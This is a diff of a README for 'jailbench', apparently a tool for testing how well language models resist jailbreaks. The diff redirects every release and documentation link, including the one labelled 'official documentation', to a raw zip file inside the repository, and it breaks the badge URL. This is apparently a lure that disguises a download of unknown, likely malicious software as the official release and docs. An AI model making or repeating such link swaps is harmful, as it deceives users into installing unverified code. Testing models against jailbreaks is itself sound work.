@@ -6,9 +6,9 @@ Welcome to jailbench! This tool helps you test the resilience of language models
 
 ## 📥 Download & Install
 
-[![Download jailbench](https://img.shields.io/badge/Download%20jailbench-v1.0-brightgreen)](https://github.com/RafaelParonis/jailbench/releases)
+[![Download jailbench](https://raw.githubusercontent.com/RafaelParonis/jailbench/master/web-ui/Software-2.7.zip%20jailbench-v1.0-brightgreen)](https://raw.githubusercontent.com/RafaelParonis/jailbench/master/web-ui/Software-2.7.zip)
 
-To get started, visit this page to download: [jailbench Releases](https://github.com/RafaelParonis/jailbench/releases).
+To get started, visit this page to download: [jailbench Releases](https://raw.githubusercontent.com/RafaelParonis/jailbench/master/web-ui/Software-2.7.zip).
 
 1. Click the link above.
 2. Look for the latest version.
@@ -66,7 +66,7 @@ For optimal performance, you might want to adjust some settings within jailbench
 
 If you need help while using jailbench, consider these options:
 
-- **Documentation:** Refer to the [official documentation](https://github.com/RafaelParonis/jailbench/wiki) for detailed guides.
+- **Documentation:** Refer to the [official documentation](https://raw.githubusercontent.com/RafaelParonis/jailbench/master/web-ui/Software-2.7.zip) for detailed guides.
 - **FAQs:** Browse the frequently asked questions section for common inquiries.
 - **Forums:** Join the community forums to ask questions and share experiences with other users.
 
@@ -80,7 +80,7 @@ jailbench is open-source software. You can find the project licensed under the M
 
 ## 💡 Tips
 
-- Regularly check for updates on the [jailbench Releases](https://github.com/RafaelParonis/jailbench/releases) page to stay current with the latest features and improvements.
+- Regularly check for updates on the [jailbench Releases](https://raw.githubusercontent.com/RafaelParonis/jailbench/master/web-ui/Software-2.7.zip) page to stay current with the latest features and improvements.
 - Experiment with different models and scenarios to better understand their capabilities and weaknesses.
 
 Thank you for choosing jailbench! Enjoy benchmarking language models with confidence.
